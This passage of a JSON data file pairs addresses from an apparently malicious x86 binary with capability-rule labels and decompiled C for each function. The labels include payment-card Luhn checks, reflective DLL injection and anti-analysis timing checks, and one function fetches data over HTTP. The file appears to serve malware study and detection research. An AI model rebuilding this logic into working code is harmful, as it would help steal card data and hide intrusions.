uVar3);\n            *(unaff_ESI + 0x3c) = uVar1;\n            *(unaff_EDI + 0x30) = uVar1;\n        }\n        if (uVar3 != 0) {\n            fcn.00420150(var_8h, var_4h, uVar3);\n            var_8h = var_8h + uVar3;\n            var_4h = var_4h + uVar3;\n        }\n    }\n    *(unaff_EDI + 0xc) = var_8h;\n    *(unaff_ESI + 0x30) = var_4h;\n    return arg_8h;\n}\n",
        "token_count": 906
    },
    "00404715": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "inject DLL reflectively/5c249d14806d4a4ea88afb4f94553771"
        ],
        "decompiled_code": "\nvoid fcn.00404715(uchar param_1, uchar param_2, uint param_3, uint param_4)\n\n{\n    int32_t in_EAX;\n    uint *puVar1;\n    \n    puVar1 = (**(in_EAX + 0x20))(*(in_EAX + 0x28), 1, 0x1c);\n    if (puVar1 != NULL) {\n        *puVar1 = 0;\n        *(puVar1 + 4) = param_1;\n        *(puVar1 + 0x11) = param_2;\n        puVar1[5] = param_3;\n        puVar1[6] = param_4;\n    }\n    return;\n}\n",
        "token_count": 160
    },
    "00404cdd": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "inject DLL reflectively/5c249d14806d4a4ea88afb4f94553771"
        ],
        "decompiled_code": "\nuint * fcn.00404cdd(uint param_1)\n\n{\n    int32_t in_EAX;\n    uint *puVar1;\n    int32_t iVar2;\n    int32_t unaff_EBX;\n    \n    puVar1 = (**(in_EAX + 0x20))(*(in_EAX + 0x28), 1, 0x40);\n    if (puVar1 != NULL) {\n        iVar2 = (**(in_EAX + 0x20))(*(in_EAX + 0x28), 8, 0x5a0);\n        puVar1[9] = iVar2;\n        if (iVar2 == 0) {\n            (**(in_EAX + 0x24))(*(in_EAX + 0x28), puVar1);\n        }\n        else {\n            iVar2 = (**(in_EAX + 0x20))(*(in_EAX + 0x28), 1);\n            puVar1[10] = iVar2;\n            if (iVar2 != 0) {\n                *puVar1 = 0;\n                puVar1[0xb] = iVar2 + unaff_EBX;\n                puVar1[0xe] = param_1;\n                fcn.00404c82();\n                return puVar1;\n            }\n            (**(in_EAX + 0x24))(*(in_EAX + 0x28), puVar1[9]);\n            (**(in_EAX + 0x24))(*(in_EAX + 0x28), puVar1);\n        }\n    }\n    return NULL;\n}\n",
        "token_count": 347
    },
    "004061dd": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "inject DLL reflectively/5c249d14806d4a4ea88afb4f94553771"
        ],
        "decompiled_code": "\nuint fcn.004061dd(void)\n\n{\n    int32_t iVar1;\n    int32_t unaff_ESI;\n    uint uVar2;\n    \n    if (unaff_ESI == 0) {\n        uVar2 = 0xfffffffe;\n    }\n    else {\n        *(unaff_ESI + 0x18) = 0;\n        if (*(unaff_ESI + 0x20) == 0) {\n            *(unaff_ESI + 0x20) = 0x40612d;\n            *(unaff_ESI + 0x28) = 0;\n        }\n        if (*(unaff_ESI + 0x24) == 0) {\n            *(unaff_ESI + 0x24) = 0x40613d;\n        }\n        iVar1 = (**(unaff_ESI + 0x20))(*(unaff_ESI + 0x28), 1, 0x18);\n        *(unaff_ESI + 0x1c) = iVar1;\n        if (iVar1 != 0) {\n            *(iVar1 + 0x14) = 0;\n            *(*(unaff_ESI + 0x1c) + 0xc) = 0;\n            *(*(unaff_ESI + 0x1c) + 0xc) = 1;\n            *(*(unaff_ESI + 0x1c) + 0x10) = 0xf;\n            iVar1 = fcn.00404cdd(~-(*(*(unaff_ESI + 0x1c) + 0xc) != 0) & 0x40601b);\n            *(*(unaff_ESI + 0x1c) + 0x14) = iVar1;\n            if (iVar1 != 0) {\n                fcn.00406148();\n                return 0;\n            }\n            fcn.00406185();\n        }\n        uVar2 = 0xfffffffc;\n    }\n    return uVar2;\n}\n",
        "token_count": 441
    },
    "00406c54": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a"
        ],
        "decompiled_code": "\nint32_t fcn.00406c54(void)\n\n{\n    int32_t iVar1;\n    int32_t unaff_ESI;\n    \n    if (unaff_ESI == 0) {\n        return -0x66;\n    }\n    *(unaff_ESI + 0x10) = 0;\n    *(unaff_ESI + 0x14) = *(unaff_ESI + 0x24);\n    iVar1 = fcn.00406a31(unaff_ESI, unaff_ESI + 0x28, unaff_ESI + 0x78, 0, 0);\n    *(unaff_ESI + 0x18) = iVar1 == 0;\n    return iVar1;\n}\n",
        "token_count": 159
    },
    "00408225": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.00408225(uint arg_8h)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint var_ch;\n    uint32_t var_8h;\n    uint var_4h;\n    \n    uVar1 = (**0x446508)(0, 60000);\n    uVar1 = (**0x446490)(uVar1);\n    (**0x4464ac)(uVar1, arg_8h);\n    var_4h._0_2_ = 0x2c;\n    iVar2 = fcn.0041ebdd(uVar1, &var_4h, &var_ch);\n    if (iVar2 != 0) {\n        var_8h = 0;\n        do {\n            if (0xb < var_8h) goto code_r0x0040837c;\n    // switch table (12 cases) at 0x4083a1\n            switch(*(var_8h * 4 + 0x4083a1)) {\n            case 0x408291:\n                *0x4442d8 = 1;\n                break;\n            case 0x40829d:\n                iVar2 = (**0x4464dc)(iVar2, 0x43df6c);\n                if (iVar2 == 0) {\n                    *0x446668 = 1;\n                }\n                break;\n            case 0x4082b9:\n                iVar2 = (**0x4464dc)(iVar2, 0x43df6c);\n                if (iVar2 == 0) {\n                    *0x446669 = 1;\n                }\n                break;\n            case 0x4082d5:\n                iVar2 = (**0x4464dc)(iVar2, 0x43df6c);\n                if (iVar2 == 0) {\n                    *0x44666a = 1;\n                }\n                break;\n            case 0x4082f1:\n                iVar2 = (**0x4464dc)(iVar2, 0x43df6c);\n                if (iVar2 == 0) {\n                    *0x446670 = 1;\n                }\n                break;\n            case 0x408309:\n                uVar1 = (**0x446508)(0, 999999);\n                uVar1 = (**0x446490)(uVar1);\n                *0x44626c = uVar1;\n                goto code_r0x00408374;\n            case 0x408320:\n                iVar2 = (**0x4464dc)(iVar2, 0x43df6c);\n                if (iVar2 == 0) {\n                    *0x44666d = 1;\n                }\n                break;\n            case 0x408335:\n                iVar2 = (**0x4464dc)(iVar2, 0x43df6c);\n                if (iVar2 == 0) {\n                    *0x44666e = 1;\n                }\n                break;\n            case 0x40834a:\n                iVar2 = (**0x4464dc)(iVar2, 0x43df6c);\n                if (iVar2 == 0) {\n                    *0x44666f = 1;\n                }\n                break;\n            case 0x40835f:\n                uVar1 = (**0x446508)(0, 999999);\n                uVar1 = (**0x446490)(uVar1);\n                *0x446260 = uVar1;\ncode_r0x00408374:\n                (**0x4464ac)(uVar1, iVar2);\n            }\ncode_r0x0040837c:\n            iVar2 = fcn.0041ebdd(0, &var_4h, &var_ch);\n            var_8h = var_8h + 1;\n        } while (iVar2 != 0);\n    }\n    return;\n}\n",
        "token_count": 855
    },
    "00408c16": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00408c16(void)\n\n{\n    uint uVar1;\n    uint *arg_8h;\n    uint var_7d8h;\n    uint var_3f0h;\n    uint32_t var_4h;\n    \n    var_4h = *0x443674 ^ &stack0xfffffffc;\n    fcn.004257d0(&var_3f0h, 0, 1000);\n    fcn.004257d0(&var_7d8h, 0, 1000);\n    (**0x4464ac)(&var_7d8h, *0x445d70);\n    uVar1 = fcn.00416c79(0x1a);\n    (**0x4464ac)(&var_3f0h, uVar1);\n    arg_8h = &var_7d8h;\n    (**0x4464ac)(&var_3f0h);\n    fcn.00408912();\n    fcn.0041e0a1(arg_8h);\n    return;\n}\n",
        "token_count": 236
    },
    "00409689": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl\nfcn.00409689(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch, uint arg_20h, \n            uint arg_24h)\n\n{\n    int32_t noname_3;\n    uint unaff_EBP;\n    uint unaff_ESI;\n    uint unaff_retaddr;\n    uint in_stack_00000024;\n    uint in_stack_00000028;\n    uint in_stack_0000002c;\n    uint in_stack_00000030;\n    uint in_stack_00000034;\n    uint in_stack_00000038;\n    uint in_stack_0000003c;\n    uint in_stack_00000040;\n    uint in_stack_00000044;\n    uint in_stack_00000048;\n    uint in_stack_0000004c;\n    uint in_stack_00000050;\n    uint var_4h;\n    \n    noname_3 = fcn.0041ebdd(arg_8h, 0x43dfc0, &var_4h);\n    while (noname_3 != 0) {\n        fcn.0040912f(arg_10h, 0x43bd76, arg_ch, noname_3, arg_14h, arg_18h, arg_1ch, arg_20h, arg_24h, 0, unaff_ESI, \n                     var_4h, unaff_EBP, unaff_retaddr, arg_8h, arg_ch, arg_10h, arg_14h, arg_18h, arg_1ch, arg_20h, \n                     arg_24h, in_stack_00000024, in_stack_00000028, in_stack_0000002c, in_stack_00000030, \n                     in_stack_00000034, in_stack_00000038, in_stack_0000003c, in_stack_00000040, in_stack_00000044, \n                     in_stack_00000048, in_stack_0000004c, in_stack_00000050);\n        noname_3 = fcn.0041ebdd(0, 0x43dfc0, &var_4h);\n    }\n    return;\n}\n",
        "token_count": 513
    },
    "00409b5c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid fcn.00409b5c(void)\n\n{\n    uint arg_1ch;\n    int32_t iVar1;\n    uint unaff_ESI;\n    uint uStackY125036;\n    uint32_t uStackY125028;\n    uchar auStackY125024 [4];\n    int32_t iStackY125020;\n    int32_t iStackY125016;\n    uchar auStackY110012 [55000];\n    uchar auStackY55012 [50000];\n    uint var_1390h;\n    uint uStackY52;\n    uint var_4h;\n    \n    fcn.0042cc70();\n    arg_1ch = *0x446274;\n    fcn.004257d0();\n    fcn.004257d0();\n    fcn.004257d0();\n    fcn.004257d0();\n    fcn.004257d0();\n    (**0x4464ac)();\n    iStackY125016 = fcn.0041ebdd(&stack0xffff291c, 0x43df5c, &stack0xfffe17a0);\n    iStackY125020 = 1;\n    do {\n        if (iStackY125016 == 0) {\n            fcn.0041e0a1(unaff_ESI);\n            return;\n        }\n        if (iStackY125020 == 1) {\n            fcn.004257d0();\ncode_r0x00409d25:\n            (**0x4464ac)();\n        }\n        else {\n            if (iStackY125020 == 2) {\n                fcn.004257d0();\n                goto code_r0x00409d25;\n            }\n            if (iStackY125020 == 3) {\n                fcn.004257d0();\n                goto code_r0x00409d25;\n            }\n            if (iStackY125020 == 4) {\n                uStackY125036 = fcn.0041ed83();\n            }\n            else if (iStackY125020 == 5) {\n                iVar1 = (**0x4464dc)();\n                uStackY125028 = iVar1 == 0;\n            }\n            else if (iStackY125020 == 6) {\n                fcn.004257d0();\n                (**0x4464ac)();\n                uStackY52 = 0x409ca5;\n                fcn.004096dd(uStackY125036, &fcn.00409b5c::var_1390h, &stack0xfffe5244, uStackY125028, iStackY125016, \n                             arg_1ch);\n                iStackY125020 = 0;\n            }\n        }\n        iStackY125020 = iStackY125020 + 1;\n        iStackY125016 = fcn.0041ebdd(0, 0x43df5c, &stack0xfffe17a0);\n    } while( true );\n}\n",
        "token_count": 655
    },
    "0040a79e": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_2ch_2\n// WARNING: Variable defined which should be unmapped: var_4ch\n\nvoid __cdecl\nfcn.0040a79e(uint noname_0, uint noname_1, uint noname_2, uint noname_3, uint noname_4, uint noname_5, uint noname_6, \n            uint noname_7, uint noname_8, uint noname_9, uint arg_8h, uint noname_11, uint noname_12, uint noname_13, \n            uint noname_14, uint arg_1ch)\n\n{\n    int32_t iVar1;\n    int32_t unaff_EBP;\n    uint var_8h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_4h;\n    uint var_4ch_2;\n    uint var_48h;\n    uint var_2ch_2;\n    int32_t var_4ch;\n    uint var_18h_2;\n    uint var_2ch;\n    \n    fcn.004208fe();\n    *(unaff_EBP + -4) = 0;\n    *(unaff_EBP + -0x18) = 0xf;\n    *(unaff_EBP + -0x1c) = 0;\n    *(unaff_EBP + -0x2c) = 0;\n    *(unaff_EBP + -4) = 2;\n    fcn.0040d76f();\n    (**0x4464dc)();\n    *(unaff_EBP + -0x4c) = &fcn.0040a79e::var_4ch;\n    fcn.0040c183(&fcn.0040a79e::var_4ch, unaff_EBP + 8);\n    fcn.00409eb1(unaff_EBP + -0x48);\n    *(unaff_EBP + -4) = 3;\n    fcn.00403f0c();\n    *(unaff_EBP + -4) = 2;\n    fcn.00403f73();\n    iVar1 = (**0x4464dc)();\n    if (iVar1 == 0) {\n        var_4ch = 0x40a86c;\n        fcn.00403fb5();\n    }\n    else {\n        var_4ch = unaff_EBP + 8;\n        fcn.00404029(var_4ch, 0, 0xffffffff);\n        iVar1 = *(unaff_EBP + -0x2c);\n        if (*(unaff_EBP + -0x18) < 0x10) {\n            iVar1 = unaff_EBP + -0x2c;\n        }\n        fcn.00408225(iVar1);\n    }\n    var_4ch = 0;\n    fcn.00403f73(1);\n    fcn.00403f73(1, 0);\n    fcn.00403f73(1, 0);\n    fcn.00420948();\n    return;\n}\n",
        "token_count": 678
    },
    "0040ac49": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_10h\n\nvoid fcn.0040ac49(void)\n\n{\n    uint arg_8h;\n    int32_t *in_FS_OFFSET;\n    uchar auStackY100020 [99380];\n    uchar *arg_8h_00;\n    uint var_10h;\n    int32_t var_ch;\n    uint uStack12;\n    uint var_4h;\n    \n    var_4h = 0xffffffff;\n    uStack12 = 0x432a28;\n    var_ch = *in_FS_OFFSET;\n    fcn.0042cc70();\n    *in_FS_OFFSET = &var_ch;\n    fcn.004257d0();\n    (**0x4464ac)();\n    fcn.00407fd4();\n    var_4h = 0;\n    (**0x4464ac)();\n    var_4h = 0xffffffff;\n    fcn.00403f73();\n    (**0x4464ac)();\n    (**0x4464ac)();\n    fcn.004155ec();\n    (**0x4464ac)();\n    (**0x4464ac)();\n    (**0x4464ac)();\n    fcn.00415db8();\n    var_4h = 1;\n    (**0x4464ac)();\n    var_4h = 0xffffffff;\n    fcn.00403f73();\n    (**0x4464ac)();\n    (**0x4464ac)();\n    fcn.00415d61();\n    var_4h = 2;\n    (**0x4464ac)();\n    var_4h = 0xffffffff;\n    fcn.00403f73();\n    (**0x4464ac)();\n    (**0x4464ac)();\n    fcn.00415659();\n    var_4h = 3;\n    (**0x4464ac)();\n    var_4h = 0xffffffff;\n    fcn.00403f73();\n    (**0x4464ac)();\n    (**0x4464ac)();\n    arg_8h = (**0x446420)();\n    fcn.004169b0(arg_8h);\n    var_4h = 4;\n    (**0x4464ac)();\n    var_4h = 0xffffffff;\n    fcn.00403f73();\n    (**0x4464ac)();\n    (**0x4464ac)();\n    (**0x4464ac)();\n    (**0x4464ac)();\n    fcn.00415c6d();\n    (**0x4464ac)();\n    (**0x4464ac)();\n    (**0x446528)();\n    (**0x4464cc)();\n    (**0x4464ac)();\n    (**0x4464ac)();\n    (**0x4464ac)();\n    fcn.00415c1d();\n    (**0x4464ac)();\n    (**0x4464ac)();\n    (**0x4464ac)();\n    fcn.00415d19();\n    (**0x4464ac)();\n    (**0x4464ac)();\n    (**0x4464ac)();\n    fcn.00415e7d();\n    var_4h = 5;\n    (**0x4464ac)();\n    var_4h = 0xffffffff;\n    fcn.00403f73();\n    (**0x4464ac)();\n    (**0x4464ac)();\n    fcn.00415f5d();\n    var_4h = 6;\n    (**0x4464ac)();\n    var_4h = 0xffffffff;\n    fcn.00403f73();\n    (**0x4464ac)();\n    (**0x4464ac)();\n    fcn.0041610f();\n    (**0x4464ac)();\n    (**0x4464ac)();\n    (**0x4464ac)();\n    fcn.004155ec();\n    (**0x4464ac)();\n    (**0x4464ac)();\n    (**0x4464ac)();\n    fcn.00416063();\n    var_4h = 7;\n    (**0x4464ac)();\n    var_4h = 0xffffffff;\n    fcn.00403f73();\n    (**0x4464ac)();\n    (**0x4464ac)();\n    (**0x4464ac)();\n    (**0x4464ac)();\n    fcn.0041594e();\n    (**0x4464ac)();\n    (**0x4464ac)();\n    (**0x4464ac)();\n    fcn.00415901();\n    var_4h = 8;\n    (**0x4464ac)();\n    var_4h = 0xffffffff;\n    fcn.00403f73();\n    (**0x4464ac)();\n    (**0x4464ac)();\n    fcn.00415b9d();\n    (**0x4464ac)();\n    (**0x4464ac)();\n    (**0x4464ac)();\n    (**0x446488)();\n    (**0x4464ac)();\n    (**0x4464ac)();\n    (**0x4464ac)();\n    (**0x4464ac)();\n    arg_8h_00 = auStackY100020;\n    fcn.004161f5();\n    (**0x4464ac)();\n    (**0x4464ac)();\n    (**0x4464ac)();\n    fcn.004159fa();\n    (**0x4463a4)();\n    fcn.0041d4dc();\n    *in_FS_OFFSET = var_ch;\n    fcn.0041e0a1(arg_8h_00);\n    return;\n}\n",
        "token_count": 1195
    },
    "0040be36": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0040be36(void)\n\n{\n    uint8_t uVar1;\n    uint8_t *puVar2;\n    int32_t iVar3;\n    uint8_t *puVar4;\n    uint8_t *puVar5;\n    bool bVar6;\n    \n    puVar4 = *0x446228;\n    puVar2 = fcn.00415d19();\n    puVar5 = *0x4460d8;\n    do {\n        uVar1 = *puVar2;\n        bVar6 = uVar1 < *puVar4;\n        if (uVar1 != *puVar4) {\ncode_r0x0040be62:\n            iVar3 = (1 - bVar6) - (bVar6 != 0);\n            goto code_r0x0040be67;\n        }\n        if (uVar1 == 0) break;\n        uVar1 = puVar2[1];\n        bVar6 = uVar1 < puVar4[1];\n        if (uVar1 != puVar4[1]) goto code_r0x0040be62;\n        puVar2 = puVar2 + 2;\n        puVar4 = puVar4 + 2;\n    } while (uVar1 != 0);\n    iVar3 = 0;\ncode_r0x0040be67:\n    if (iVar3 == 0) {\n        puVar4 = fcn.00415c1d();\n        do {\n            uVar1 = *puVar4;\n            bVar6 = uVar1 < *puVar5;\n            if (uVar1 != *puVar5) {\ncode_r0x0040be96:\n                iVar3 = (1 - bVar6) - (bVar6 != 0);\n                goto code_r0x0040be9b;\n            }\n            if (uVar1 == 0) break;\n            uVar1 = puVar4[1];\n            bVar6 = uVar1 < puVar5[1];\n            if (uVar1 != puVar5[1]) goto code_r0x0040be96;\n            puVar4 = puVar4 + 2;\n            puVar5 = puVar5 + 2;\n        } while (uVar1 != 0);\n        iVar3 = 0;\ncode_r0x0040be9b:\n        if (iVar3 == 0) {\n            (**0x446410)(0);\n        }\n    }\n    return;\n}\n",
        "token_count": 539
    },
    "0040c183": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Variable defined which should be unmapped: var_10h\n\nvoid __cdecl fcn.0040c183(uint arg_8h, uint arg_ch)\n\n{\n    uchar *puVar1;\n    int32_t unaff_EBP;\n    uint unaff_EDI;\n    uint var_10h;\n    uint var_4h;\n    \n    fcn.00420895(4);\n    puVar1 = *(unaff_EBP + 8);\n    *(unaff_EBP + -0x10) = 0;\n    *(puVar1 + 0x14) = 0xf;\n    *(puVar1 + 0x10) = 0;\n    *puVar1 = 0;\n    *(unaff_EBP + -4) = 0;\n    *(unaff_EBP + -0x10) = 1;\n    fcn.0040c263();\n    fcn.004043b8(*(unaff_EBP + 0xc), 0);\n    fcn.004043b8(unaff_EDI, 0);\n    fcn.00420934();\n    return;\n}\n",
        "token_count": 260
    },
    "0040c1db": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_10h\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.0040c1db(uint arg_8h, uint arg_ch)\n\n{\n    char cVar1;\n    uchar *puVar2;\n    char *pcVar3;\n    int32_t unaff_EBP;\n    uint unaff_EDI;\n    uint var_14h;\n    uint var_10h;\n    uint var_4h;\n    \n    fcn.00420895(8);\n    puVar2 = *(unaff_EBP + 8);\n    *(unaff_EBP + -0x10) = 0;\n    *(puVar2 + 0x14) = 0xf;\n    *(puVar2 + 0x10) = 0;\n    *puVar2 = 0;\n    pcVar3 = *(unaff_EBP + 0xc);\n    *(unaff_EBP + -4) = 0;\n    *(unaff_EBP + -0x10) = 1;\n    *(unaff_EBP + -0x14) = pcVar3 + 1;\n    do {\n        cVar1 = *pcVar3;\n        pcVar3 = pcVar3 + 1;\n    } while (cVar1 != '\\0');\n    fcn.0040c263();\n    fcn.004043b8(unaff_EDI, 0);\n    fcn.0040c23f(puVar2, *(unaff_EBP + 0xc));\n    fcn.00420934();\n    return;\n}\n",
        "token_count": 355
    },
    "0040c291": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0040c291(int32_t param_1)\n\n{\n    char cVar1;\n    uint *in_EAX;\n    int32_t iVar2;\n    uint *puVar3;\n    uint32_t unaff_EBX;\n    \n    cVar1 = fcn.00404124();\n    if (cVar1 == '\\0') {\n        iVar2 = in_EAX[4];\n        if (-iVar2 - 1U <= unaff_EBX) {\n            iVar2 = fcn.0041d5a6(\"string too long\");\n        }\n        if (unaff_EBX != 0) {\n            iVar2 = iVar2 + unaff_EBX;\n            cVar1 = fcn.004040c2(iVar2, 0);\n            if (cVar1 != '\\0') {\n                puVar3 = in_EAX;\n                if (0xf < in_EAX[5]) {\n                    puVar3 = *in_EAX;\n                }\n                fcn.00420150(in_EAX[4] + puVar3, param_1, unaff_EBX);\n                in_EAX[4] = iVar2;\n                if (0xf < in_EAX[5]) {\n                    in_EAX = *in_EAX;\n                }\n                *(in_EAX + iVar2) = 0;\n            }\n        }\n    }\n    else {\n        puVar3 = in_EAX;\n        if (0xf < in_EAX[5]) {\n            puVar3 = *in_EAX;\n        }\n        fcn.004043b8(in_EAX, param_1 - puVar3);\n    }\n    return;\n}\n",
        "token_count": 356
    },
    "0040d490": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040d490(uint32_t arg_8h, uint32_t arg_ch)\n\n{\n    char cVar1;\n    uint *in_EAX;\n    uint32_t uVar2;\n    uint *arg_8h_00;\n    uint32_t uVar3;\n    uint *unaff_EDI;\n    \n    uVar3 = in_EAX[4];\n    uVar2 = arg_8h;\n    if (uVar3 < arg_8h) {\n        uVar2 = fcn.0041d5f3(\"invalid string position\");\n    }\n    uVar3 = uVar3 - uVar2;\n    if (arg_ch < uVar3) {\n        uVar3 = arg_ch;\n    }\n    if (unaff_EDI == in_EAX) {\n        fcn.0040d548();\n        fcn.0040d548();\n    }\n    else {\n        cVar1 = fcn.0040d5b9();\n        if (cVar1 != '\\0') {\n            if (7 < in_EAX[5]) {\n                in_EAX = *in_EAX;\n            }\n            arg_8h_00 = unaff_EDI;\n            if (7 < unaff_EDI[5]) {\n                arg_8h_00 = *unaff_EDI;\n            }\n            fcn.00420150(arg_8h_00, in_EAX + arg_8h * 2, uVar3 * 2);\n            unaff_EDI[4] = uVar3;\n            if (7 < unaff_EDI[5]) {\n                unaff_EDI = *unaff_EDI;\n            }\n            *(uVar3 * 2 + unaff_EDI) = 0;\n        }\n    }\n    return;\n}\n",
        "token_count": 390
    },
    "0040d548": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0040d548(uint32_t param_1)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    uint32_t in_EAX;\n    uint32_t uVar3;\n    uint32_t extraout_ECX;\n    uint *puVar4;\n    uint *unaff_ESI;\n    \n    uVar3 = unaff_ESI[4];\n    if (uVar3 < param_1) {\n        uVar3 = fcn.0041d5f3(\"invalid string position\");\n        param_1 = extraout_ECX;\n    }\n    uVar3 = uVar3 - param_1;\n    if (uVar3 < in_EAX) {\n        in_EAX = uVar3;\n    }\n    if (in_EAX != 0) {\n        puVar4 = unaff_ESI;\n        puVar2 = unaff_ESI;\n        if (7 < unaff_ESI[5]) {\n            puVar4 = *unaff_ESI;\n            puVar2 = *unaff_ESI;\n        }\n        fcn.0041e300(puVar4 + param_1 * 2, puVar2 + (param_1 + in_EAX) * 2, (uVar3 - in_EAX) * 2);\n        iVar1 = unaff_ESI[4];\n        unaff_ESI[4] = iVar1 - in_EAX;\n        if (7 < unaff_ESI[5]) {\n            unaff_ESI = *unaff_ESI;\n        }\n        *(unaff_ESI + (iVar1 - in_EAX) * 2) = 0;\n    }\n    return;\n}\n",
        "token_count": 366
    },
    "0040d5fa": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0040d5fa(int32_t param_1)\n\n{\n    int32_t in_EAX;\n    int32_t unaff_retaddr;\n    \n    if (in_EAX != param_1) {\n        do {\n            fcn.0040c0f0();\n            in_EAX = in_EAX + 0x1c;\n        } while (in_EAX != unaff_retaddr);\n    }\n    return;\n}\n",
        "token_count": 96
    },
    "0040d76f": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0040d76f(void)\n\n{\n    uint unaff_EBX;\n    uint var_80h;\n    uint *var_7ch;\n    uint var_78h;\n    uint var_44h;\n    uint32_t var_4h;\n    \n    var_4h = *0x443674 ^ &stack0xfffffffc;\n    fcn.004257d0(&var_44h, 0, 0x40);\n    fcn.004257d0(&var_80h, 0, 0x3c);\n    var_7ch = &var_44h;\n    var_80h = 0x3c;\n    var_78h = 0x40;\n    (**0x4463a4)();\n    (**0x446388)();\n    fcn.0041e0a1(unaff_EBX);\n    return;\n}\n",
        "token_count": 192
    },
    "0040df93": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0040df93(uint param_1)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint uVar4;\n    uint uStack1052;\n    uint uStack1048;\n    int32_t iStack1044;\n    int32_t iStack1040;\n    uint32_t uStack1036;\n    uchar auStack1032 [108];\n    uchar auStack924 [916];\n    uint32_t uStack8;\n    \n    uStack8 = *0x443674 ^ auStack924;\n    uStack1036 = 1;\n    iStack1044 = 0;\n    uVar1 = fcn.0040d76f(\"https\");\n    iVar2 = (**0x4464dc)(uVar1);\n    if (iVar2 == 0) {\n        iStack1044 = 1;\n    }\n    uVar1 = (**0x446508)(0, 99999999);\n    iStack1040 = (**0x446490)(uVar1);\n    uVar1 = (**0x4463e8)(0x43bd76, 0, 0, 0, 0);\n    uStack1052 = 600000;\n    uStack1048 = uVar1;\n    (**0x4462dc)(uVar1, 2, &uStack1052, 4);\n    if (iStack1044 == 0) {\n        uVar4 = 0x4000100;\n    }\n    else {\n        uVar4 = 0x4800100;\n    }\n    uVar1 = (**0x4463ec)(uVar1, param_1, 0, 0, uVar4, 0);\n    iVar2 = 0;\n    while (uStack1036 != 0) {\n        (**0x44640c)(uVar1, auStack1032, 0x400, &uStack1036);\n        uVar3 = 0;\n        if (uStack1036 == 0) break;\n        do {\n            *(iVar2 + iStack1040) = auStack1032[uVar3];\n            iVar2 = iVar2 + 1;\n            uVar3 = uVar3 + 1;\n        } while (uVar3 < uStack1036);\n    }\n    (**0x4463e4)(uVar1);\n    (**0x4463e4)(uStack1048);\n    fcn.0041e0a1(param_1);\n    return;\n}\n",
        "token_count": 553
    },
    "0040e530": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
